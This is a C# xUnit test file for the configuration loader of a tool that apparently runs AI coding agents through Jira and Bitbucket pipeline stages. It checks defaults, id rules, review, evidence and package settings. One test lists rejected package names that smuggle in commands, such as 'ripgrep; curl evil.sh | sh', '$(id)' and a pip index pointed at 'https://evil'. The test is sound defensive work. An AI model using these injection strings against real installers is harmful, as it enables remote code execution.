using Symphonist.Core.Config;
using Symphonist.Core.Integrations;
using Symphonist.Core.Integrations.Providers;
using Symphonist.Integrations;
using Symphonist.Integrations.Bitbucket;
using Symphonist.Integrations.Jira;

namespace Symphonist.Core.Tests.Config;

public class ProjectConfigLoaderTests
{
    private static string Fixture(string name) => Path.Combine(AppContext.BaseDirectory, "Config", name);

    [Fact]
    public void Loads_fixture_with_defaults()
    {
        var p = ProjectConfigLoader.Load(Fixture("orders.yaml"), BuiltInProviders.Registry);
        Assert.Equal("orders", p.Id);
        Assert.Equal(Isolation.Container, p.Agent.Isolation);
        Assert.Equal(60, p.Agent.TimeoutMinutes);
        Assert.Equal(3, p.MaxAttemptsPerStage);
        Assert.Equal("merge_commit", ((BitbucketRepoConfig)p.Repo).MergeStrategy);
        Assert.Equal(7, p.Pipeline.Count);
        Assert.Equal(GatePolicy.None, p.Stage("build").Gate);
        Assert.Equal("In Progress", p.Stage("plan").ApprovedWhenStatus);
        Assert.True(Path.IsPathFullyQualified(p.Repo.LocalPath));
        Assert.Equal(Path.Combine(p.ConfigDirectory, "prompts", "plan.md"), p.PromptOverrides[StageKind.Plan]);
        Assert.Equal("deploy", p.NextStage("release")!.Id);
        Assert.Null(p.NextStage("done"));
    }

    [Fact]
    public void Orders_fixture_maps_to_jira_and_bitbucket_subtypes()
    {
        var p = ProjectConfigLoader.Load(Fixture("orders.yaml"), BuiltInProviders.Registry);
        var tracker = Assert.IsType<JiraTrackerConfig>(p.Tracker);
        var repo = Assert.IsType<BitbucketRepoConfig>(p.Repo);
        Assert.IsType<BitbucketPipelinesConfig>(p.Build);
        Assert.Equal(new Uri("https://acme.atlassian.net"), tracker.Site);
        Assert.Equal("jira-acme", tracker.TokenSecret);
        Assert.Equal("acme/orders", repo.FullName);
        Assert.Equal("bitbucket-acme", repo.TokenSecret);
        Assert.Equal(45, p.Build.TimeoutMinutes);
    }

    [Fact]
    public void Empty_shared_fields_in_yaml_use_defaults()
    {
        var p = LoadYaml(FixtureYaml().Replace("  mainBranch: main\n", "  mainBranch:\n")
            .Replace("  productionBranch: production\n", "  productionBranch: ~\n")
            .Replace("  type: bitbucket-pipelines\n", "  type: bitbucket-pipelines\n  timeoutMinutes:\n"));
        Assert.Equal("main", p.Repo.MainBranch);
        Assert.Equal("production", p.Repo.ProductionBranch);
        Assert.Equal(45, p.Build.TimeoutMinutes);
    }

    [Fact]
    public void Unknown_field_in_provider_section_is_rejected()
    {
        var ex = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml().Replace("  tokenSecret: jira-acme\n", "  tokenSecret: jira-acme\n  jqll: x\n")));
        Assert.Contains("unknown field 'tracker.jqll'", ex.Message);
    }

    private sealed class FakeActionsProvider : IBuildProvider
    {
        public string Type => "github-actions";
        public string RepoType => "github";
        public string DisplayName => "Fake";
        public IReadOnlyList<ProviderField> Fields => [];
        public IReadOnlyDictionary<string, object?> ToValues(BuildConfig config) => new Dictionary<string, object?>();
        public BuildConfig Parse(BuildSection section) => new BitbucketPipelinesConfig(section.Type, section.TimeoutMinutes);
        public IBuildWatcher Create(ProjectConfig project, HttpClient http, string repoToken) =>
            throw new NotSupportedException();
        public Task<BuildDiscovery> DiscoverAsync(ProjectConfig draft, HttpClient http, string repoToken,
            CancellationToken ct) => throw new NotSupportedException();
    }

    [Fact]
    public void Build_type_must_match_repo_type()
    {
        var registry = new ProviderRegistry([new JiraProvider()], [new BitbucketProvider()],
            [new BitbucketPipelinesProvider(), new FakeActionsProvider()]);
        var dir = Directory.CreateTempSubdirectory("symphonist-cfg").FullName;
        try
        {
            var path = Path.Combine(dir, "p.yaml");
            File.WriteAllText(path, FixtureYaml().Replace("type: bitbucket-pipelines", "type: github-actions"));
            var ex = Assert.Throws<ProjectConfigException>(() => ProjectConfigLoader.Load(path, registry));
            Assert.Contains("build.type 'github-actions' needs repo.type 'github'", ex.Message);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void LoadAll_reads_yaml_files()
    {
        var all = ProjectConfigLoader.LoadAll(Path.GetDirectoryName(Fixture("orders.yaml"))!, BuiltInProviders.Registry);
        Assert.Contains(all, c => c.Id == "orders");
    }

    [Theory]
    [InlineData("pipeline: []", "pipeline must contain at least one stage")]
    [InlineData("duplicate-stage-id", "duplicate stage id 'plan'")]
    [InlineData("last-stage-not-done", "last stage must be kind 'done'")]
    [InlineData("host-without-tools", "host isolation requires agent.allowedTools")]
    [InlineData("unknown-kind", "unknown stage kind 'qa'")]
    [InlineData("pipeline: [~]", "pipeline[0] is empty")]
    [InlineData("null-entry-status", "pipeline stage 'triage' entryStatuses contains an empty item")]
    [InlineData("null-allowed-domain", "agent.allowedDomains contains an empty item")]
    [InlineData("null-prompt", "missing required 'prompts.plan'")]
    public void Rejects_invalid_config(string variant, string expectedMessage)
    {
        var yaml = File.ReadAllText(Fixture("orders.yaml")).Replace("\r\n", "\n");
        yaml = variant switch
        {
            "pipeline: []" => yaml[..yaml.IndexOf("pipeline:", StringComparison.Ordinal)] + "pipeline: []\n",
            "duplicate-stage-id" => yaml.Replace("id: build,", "id: plan,"),
            "last-stage-not-done" => string.Join('\n', yaml.Split('\n').Where(l => !l.Contains("id: done"))),
            "host-without-tools" => yaml.Replace("  type: claude-code\n", "  type: claude-code\n  isolation: host\n"),
            "unknown-kind" => yaml.Replace("kind: release", "kind: qa"),
            "pipeline: [~]" => yaml[..yaml.IndexOf("pipeline:", StringComparison.Ordinal)] + "pipeline: [~]\n",
            "null-entry-status" => yaml.Replace("entryStatuses: [Backlog]", "entryStatuses: [Backlog, ~]"),
            "null-allowed-domain" => yaml.Replace("allowedDomains: [api.nuget.org,", "allowedDomains: [~, api.nuget.org,"),
            "null-prompt" => yaml.Replace("plan: prompts/plan.md", "plan: ~"),
            _ => throw new ArgumentException(variant),
        };
        var dir = Directory.CreateTempSubdirectory("symphonist-cfg").FullName;
        try
        {
            var path = Path.Combine(dir, "bad.yaml");
            File.WriteAllText(path, yaml);
            var ex = Assert.Throws<ProjectConfigException>(() => ProjectConfigLoader.Load(path, BuiltInProviders.Registry));
            Assert.Contains(expectedMessage, ex.Message);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Theory]
    [InlineData("type: jira", "type: github", "unsupported tracker.type 'github'")]
    [InlineData("type: bitbucket\n  workspace", "type: gitlab\n  workspace", "unsupported repo.type 'gitlab'")]
    [InlineData("type: claude-code", "type: codex", "unsupported agent.type 'codex'")]
    public void Rejects_unsupported_types(string from, string to, string expectedMessage)
    {
        var yaml = File.ReadAllText(Fixture("orders.yaml")).Replace("\r\n", "\n").Replace(from, to);
        var dir = Directory.CreateTempSubdirectory("symphonist-cfg").FullName;
        try
        {
            var path = Path.Combine(dir, "bad.yaml");
            File.WriteAllText(path, yaml);
            var ex = Assert.Throws<ProjectConfigException>(() => ProjectConfigLoader.Load(path, BuiltInProviders.Registry));
            Assert.Contains(expectedMessage, ex.Message);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void Parse_reads_yaml_text_and_resolves_paths_against_directory()
    {
        var dir = Path.Combine(Path.GetTempPath(), "symphonist-parse");
        var p = ProjectConfigLoader.Parse(FixtureYaml(), dir, "draft", BuiltInProviders.Registry);
        Assert.Equal(Path.GetFullPath("../acme-orders", dir), p.Repo.LocalPath);
        Assert.Equal(dir, p.ConfigDirectory);
    }

    [Fact]
    public void Parse_errors_are_prefixed_with_source_name()
    {
        var yaml = FixtureYaml();
        var noTracker = yaml[..yaml.IndexOf("tracker:", StringComparison.Ordinal)]
            + yaml[yaml.IndexOf("repo:", StringComparison.Ordinal)..];
        var missing = Assert.Throws<ProjectConfigException>(() =>
            ProjectConfigLoader.Parse(noTracker, Path.GetTempPath(), "draft", BuiltInProviders.Registry));
        Assert.StartsWith("draft: missing required 'tracker'", missing.Message);
        var unknown = Assert.Throws<ProjectConfigException>(() =>
            ProjectConfigLoader.Parse(yaml.Replace("  tokenSecret: jira-acme\n", "  tokenSecret: jira-acme\n  nope: x\n"),
                Path.GetTempPath(), "draft", BuiltInProviders.Registry));
        Assert.StartsWith("draft: unknown field 'tracker.nope'", unknown.Message);
    }

    private static string WithId(string id) =>
        System.Text.RegularExpressions.Regex.Replace(FixtureYaml(), @"(?m)^id:.*$", $"id: \"{id}\"");

    [Theory]
    [InlineData("../x")]
    [InlineData("-x")]
    [InlineData("a/b")]
    [InlineData("a b")]
    [InlineData("")]
    public void Unsafe_project_id_is_rejected(string id)
    {
        var ex = Assert.Throws<ProjectConfigException>(() => LoadYaml(WithId(id)));
        Assert.Contains(id.Length == 0 ? "missing required 'id'" : $"invalid id '{id}'", ex.Message);
    }

    [Theory]
    [InlineData("CON")]
    [InlineData("con")]
    [InlineData("Prn")]
    [InlineData("aux")]
    [InlineData("NUL")]
    [InlineData("com0")]
    [InlineData("COM9")]
    [InlineData("lpt1")]
    [InlineData("CONIN$")]
    [InlineData("conout$")]
    public void Windows_device_name_id_is_rejected(string id)
    {
        Assert.False(ProjectConfigLoader.IsValidProjectId(id));
        var ex = Assert.Throws<ProjectConfigException>(() => LoadYaml(WithId(id)));
        Assert.Contains($"invalid id '{id}': a reserved device name on Windows", ex.Message);
    }

    [Theory]
    [InlineData("orders")]
    [InlineData("Acme_Orders-2")]
    [InlineData("console")]
    [InlineData("com10")]
    [InlineData("lpt")]
    [InlineData("orders-github")]
    public void Safe_project_id_is_accepted(string id) => Assert.Equal(id, LoadYaml(WithId(id)).Id);

    [Fact]
    public void Jira_project_key_is_parsed_and_validated()
    {
        const string anchor = "  tokenSecret: jira-acme\n";
        Assert.Null(((JiraTrackerConfig)LoadYaml(FixtureYaml()).Tracker).ProjectKey);
        Assert.Equal("ACME", ((JiraTrackerConfig)LoadYaml(FixtureYaml().Replace(anchor, anchor + "  projectKey: ACME\n")).Tracker).ProjectKey);
        var ex = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml().Replace(anchor, anchor + "  projectKey: acme-1\n")));
        Assert.Contains("invalid tracker.projectKey 'acme-1'", ex.Message);
    }

    [Theory]
    [InlineData("http://acme.atlassian.net")]
    [InlineData("ftp://acme.atlassian.net")]
    [InlineData("acme.atlassian.net")]
    public void Jira_site_must_be_https(string site)
    {
        var ex = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml().Replace("  site: https://acme.atlassian.net", $"  site: {site}")));
        Assert.Contains($"tracker.site must be an https:// URL (got '{site}')", ex.Message);
    }

    private static ProjectConfig LoadYaml(string yaml)
    {
        var dir = Directory.CreateTempSubdirectory("symphonist-cfg").FullName;
        try
        {
            var path = Path.Combine(dir, "p.yaml");
            File.WriteAllText(path, yaml);
            return ProjectConfigLoader.Load(path, BuiltInProviders.Registry);
        }
        finally { Directory.Delete(dir, true); }
    }

    private static string FixtureYaml() => File.ReadAllText(Fixture("orders.yaml")).Replace("\r\n", "\n");

    [Fact]
    public void Risk_areas_and_review_are_parsed()
    {
        var yaml = FixtureYaml()
            .Replace("  allowedDomains: [api.nuget.org, registry.npmjs.org]\n",
                "  allowedDomains: [api.nuget.org, registry.npmjs.org]\n  image: acme/agent\n")
            + "riskAreas:\n"
            + "  - name: pricing\n"
            + "    description: Anything that changes order prices.\n"
            + "    paths: [\"src/Pricing/**\"]\n"
            + "review:\n"
            + "  mode: active\n"
            + "  prompt: prompts/review.md\n"
            + "  agent: { type: claude-code, model: opus }\n";
        var p = LoadYaml(yaml);

        var area = Assert.Single(p.RiskAreas);
        Assert.Equal("pricing", area.Name);
        Assert.Equal("Anything that changes order prices.", area.Description);
        Assert.Equal(["src/Pricing/**"], area.Paths);
        Assert.Equal(ReviewMode.Active, p.Review.Mode);
        Assert.Equal("opus", p.Review.Agent.Model);
        Assert.Equal(20, p.Review.Agent.TimeoutMinutes);
        Assert.Equal(p.Agent.Isolation, p.Review.Agent.Isolation);
        Assert.Equal("acme/agent", p.Review.Agent.Image);
        Assert.Equal(p.Agent.AllowedDomains, p.Review.Agent.AllowedDomains);
        Assert.Equal(Path.Combine(p.ConfigDirectory, "prompts", "review.md"), p.Review.PromptPath);
    }

    [Fact]
    public void Agent_packages_are_parsed_and_shared_with_the_reviewer()
    {
        var yaml = FixtureYaml().Replace("  allowedDomains: [api.nuget.org, registry.npmjs.org]\n",
            "  allowedDomains: [api.nuget.org, registry.npmjs.org]\n"
            + "  packages:\n"
            + "    apt: [ripgrep, \"jq=1.7.1-3build1\"]\n"
            + "    pip: [graphifyy, \"graphifyy==0.8.33\", \"requests[socks]>=2.31,<3\", graphifyy]\n"
            + "    npm: [\"@scope/tool@1.2.0\", typescript]\n");
        var p = LoadYaml(yaml);

        Assert.Equal(["ripgrep", "jq=1.7.1-3build1"], p.Agent.Packages.Apt);
        Assert.Equal(["graphifyy", "graphifyy==0.8.33", "requests[socks]>=2.31,<3"], p.Agent.Packages.Pip);
        Assert.Equal(["@scope/tool@1.2.0", "typescript"], p.Agent.Packages.Npm);
        Assert.Same(p.Agent.Packages, p.Review.Agent.Packages);
    }

    [Fact]
    public void Agent_packages_default_to_none()
    {
        var p = ProjectConfigLoader.Load(Fixture("orders.yaml"), BuiltInProviders.Registry);
        Assert.True(p.Agent.Packages.IsEmpty);
        Assert.True(p.Review.Agent.Packages.IsEmpty);
    }

    [Theory]
    [InlineData("apt", "\"ripgrep; curl evil.sh | sh\"")]
    [InlineData("apt", "\"-o=APT::Foo\"")]
    [InlineData("apt", "\"two words\"")]
    [InlineData("pip", "\"pkg'\"")]
    [InlineData("pip", "\"--index-url=https://evil\"")]
    [InlineData("pip", "\"pkg\\nRUN evil\"")]
    [InlineData("npm", "\"$(id)\"")]
    [InlineData("npm", "\"tool@`id`\"")]
    public void Rejects_unsafe_agent_packages(string installer, string item)
    {
        var yaml = FixtureYaml().Replace("  allowedDomains: [api.nuget.org, registry.npmjs.org]\n",
            $"  allowedDomains: [api.nuget.org, registry.npmjs.org]\n  packages:\n    {installer}: [{item}]\n");
        var ex = Assert.Throws<ProjectConfigException>(() => LoadYaml(yaml));
        Assert.Contains($"in agent.packages.{installer}", ex.Message);
    }

    [Fact]
    public void Review_defaults_to_off_with_read_only_tools()
    {
        var p = ProjectConfigLoader.Load(Fixture("orders.yaml"), BuiltInProviders.Registry);
        Assert.Empty(p.RiskAreas);
        Assert.Equal(ReviewMode.Off, p.Review.Mode);
        Assert.Equal(ReviewConfig.ReadOnlyTools, p.Review.Agent.AllowedTools);
        Assert.Equal(["Read", "Grep", "Glob"], p.Review.Agent.AllowedTools);
        Assert.Null(p.Review.PromptPath);
        Assert.Equal(20, p.Review.Agent.TimeoutMinutes);
    }

    [Theory]
    [InlineData("auto")]
    [InlineData("autoWhenLowRisk")]
    public void Auto_gate_is_parsed(string gate)
    {
        var p = LoadYaml(FixtureYaml().Replace("kind: implement, gate: human", $"kind: implement, gate: {gate}"));
        Assert.Equal(GatePolicy.AutoWhenLowRisk, p.Stage("implement").Gate);
    }

    [Fact]
    public void Auto_gate_on_build_is_rejected()
    {
        var ex = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml().Replace("{ id: build,     kind: build }", "{ id: build,     kind: build, gate: auto }")));
        Assert.Contains("stage 'build': gate 'auto' is only supported for triage, plan, implement and release", ex.Message);
    }

    [Fact]
    public void Unsupported_review_agent_is_rejected()
    {
        var ex = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + "review:\n  mode: shadow\n  agent: { type: codex }\n"));
        Assert.Contains("unsupported review.agent.type 'codex'", ex.Message);
    }

    [Fact]
    public void Duplicate_or_incomplete_risk_area_is_rejected()
    {
        var dup = Assert.Throws<ProjectConfigException>(() => LoadYaml(FixtureYaml() +
            "riskAreas:\n  - { name: pricing, description: a }\n  - { name: pricing, description: b }\n"));
        Assert.Contains("duplicate risk area 'pricing'", dup.Message);

        var noDescription = Assert.Throws<ProjectConfigException>(() => LoadYaml(FixtureYaml() +
            "riskAreas:\n  - { name: pricing }\n"));
        Assert.Contains("missing required 'riskAreas[].description'", noDescription.Message);

        var blankPath = Assert.Throws<ProjectConfigException>(() => LoadYaml(FixtureYaml() +
            "riskAreas:\n  - { name: pricing, description: a, paths: [\"\"] }\n"));
        Assert.Contains("riskAreas 'pricing' paths contains an empty item", blankPath.Message);
    }

    [Fact]
    public void Reviews_only_gated_reviewable_stages()
    {
        var shadow = LoadYaml(FixtureYaml() + "review:\n  mode: shadow\n");
        Assert.True(shadow.Reviews(shadow.Stage("triage")));
        Assert.False(shadow.Reviews(shadow.Stage("build")));
        Assert.True(shadow.Reviews(shadow.Stage("release")));
        Assert.False(shadow.Reviews(shadow.Stage("deploy")));

        var off = ProjectConfigLoader.Load(Fixture("orders.yaml"), BuiltInProviders.Registry);
        Assert.All(off.Pipeline, s => Assert.False(off.Reviews(s)));
    }

    [Fact]
    public void Evidence_defaults_when_absent()
    {
        var p = LoadYaml(FixtureYaml());
        Assert.Equal(EvidenceMode.HighRisk, p.Evidence.Mode);
        Assert.True(p.Evidence.Run.IsEmpty);
        Assert.Empty(p.Evidence.Features);
        Assert.Equal(30, p.Evidence.Agent.TimeoutMinutes);
        Assert.Equal(p.Agent.Model, p.Evidence.Agent.Model);
        Assert.Equal(p.Agent.Isolation, p.Evidence.Agent.Isolation);
        Assert.Equal(p.Agent.Image, p.Evidence.Agent.Image);
        Assert.Equal(p.Agent.AllowedDomains, p.Evidence.Agent.AllowedDomains);
        Assert.Equal(p.Agent.AllowedTools, p.Evidence.Agent.AllowedTools);
        Assert.Equal(p.Agent.Packages, p.Evidence.Agent.Packages);
        Assert.Null(p.Evidence.PromptPath);
        Assert.False(p.PrComments.FromOthers);
    }

    [Fact]
    public void Comment_marker_defaults_and_parses()
    {
        Assert.Equal("@claude", LoadYaml(FixtureYaml()).CommentMarker);
        Assert.Equal("@symphonist", LoadYaml(FixtureYaml() + "commentMarker: \"@symphonist\"\n").CommentMarker);
    }

    [Theory]
    [InlineData("claude")]
    [InlineData("@")]
    [InlineData("@ claude")]
    [InlineData("@two words")]
    [InlineData("@-dash")]
    [InlineData("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")]
    [InlineData("")]
    public void Comment_marker_must_be_an_at_sign_and_a_name(string marker)
    {
        var ex = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + $"commentMarker: \"{marker}\"\n"));
        Assert.Contains("commentMarker", ex.Message);
        Assert.Contains("@", ex.Message);
    }

    [Fact]
    public void Evidence_section_parses()
    {
        var p = LoadYaml(FixtureYaml() + string.Join("\n",
            "evidence:",
            "  mode: always",
            "  prompt: prompts/e.md",
            "  run:",
            "    setup: [a, b]",
            "    start: npm start",
            "    url: http://localhost:3000",
            "    ready: /health",
            "    notes: needs a seeded db",
            "  features:",
            "    - { name: Checkout, steps: Add an item and pay }",
            "  agent: { timeoutMinutes: 45, model: m }",
            ""));
        Assert.Equal(EvidenceMode.Always, p.Evidence.Mode);
        Assert.Equal(["a", "b"], p.Evidence.Run.Setup);
        Assert.Equal("npm start", p.Evidence.Run.Start);
        Assert.Equal("http://localhost:3000", p.Evidence.Run.Url);
        Assert.Equal("/health", p.Evidence.Run.Ready);
        Assert.Equal("needs a seeded db", p.Evidence.Run.Notes);
        Assert.False(p.Evidence.Run.IsEmpty);
        Assert.Equal(new EvidenceFeature("Checkout", "Add an item and pay"), Assert.Single(p.Evidence.Features));
        Assert.Equal(45, p.Evidence.Agent.TimeoutMinutes);
        Assert.Equal("m", p.Evidence.Agent.Model);
        Assert.Equal(Path.Combine(p.ConfigDirectory, "prompts", "e.md"), p.Evidence.PromptPath);
    }

    [Theory]
    [InlineData("off", EvidenceMode.Off)]
    [InlineData("high-risk", EvidenceMode.HighRisk)]
    [InlineData("always", EvidenceMode.Always)]
    public void Evidence_modes(string yaml, EvidenceMode mode) =>
        Assert.Equal(mode, LoadYaml(FixtureYaml() + $"evidence:\n  mode: {yaml}\n").Evidence.Mode);

    [Fact]
    public void Unknown_evidence_mode_is_error()
    {
        var ex = Assert.Throws<ProjectConfigException>(() => LoadYaml(FixtureYaml() + "evidence:\n  mode: sometimes\n"));
        Assert.Contains("unknown evidence.mode 'sometimes'", ex.Message);
    }

    [Fact]
    public void Evidence_agent_rejects_other_keys() =>
        Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + "evidence:\n  agent: { isolation: host }\n"));

    [Fact]
    public void Evidence_limits_are_enforced()
    {
        var features = string.Concat(Enumerable.Range(0, 21).Select(i => $"    - {{ name: f{i}, steps: s }}\n"));
        var tooMany = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + "evidence:\n  features:\n" + features));
        Assert.Contains("evidence.features", tooMany.Message);

        var longName = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + $"evidence:\n  features:\n    - {{ name: {new string('n', 81)}, steps: s }}\n"));
        Assert.Contains("evidence.features[].name", longName.Message);

        var noSteps = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + "evidence:\n  features:\n    - { name: x }\n"));
        Assert.Contains("evidence.features[].steps", noSteps.Message);

        var lineBreak = Assert.Throws<ProjectConfigException>(() =>
            LoadYaml(FixtureYaml() + "evidence:\n  run:\n    start: \"a\\nb\"\n"));
        Assert.Contains("evidence.run.start", lineBreak.Message);
    }

    [Fact]
    public void Pr_comments_from_others_parses() =>
        Assert.True(LoadYaml(FixtureYaml() + "prComments: { fromOthers: true }\n").PrComments.FromOthers);

    [Fact]
    public void Wants_evidence_only_for_gated_implement()
    {
        var p = LoadYaml(FixtureYaml());
        var implement = p.Stage("implement");
        Assert.True(p.WantsEvidence(implement));
        Assert.False(p.WantsEvidence(implement with { Gate = GatePolicy.None }));
        Assert.False(p.WantsEvidence(p.Stage("plan")));
        var off = LoadYaml(FixtureYaml() + "evidence:\n  mode: off\n");
        Assert.False(off.WantsEvidence(off.Stage("implement")));
    }
}
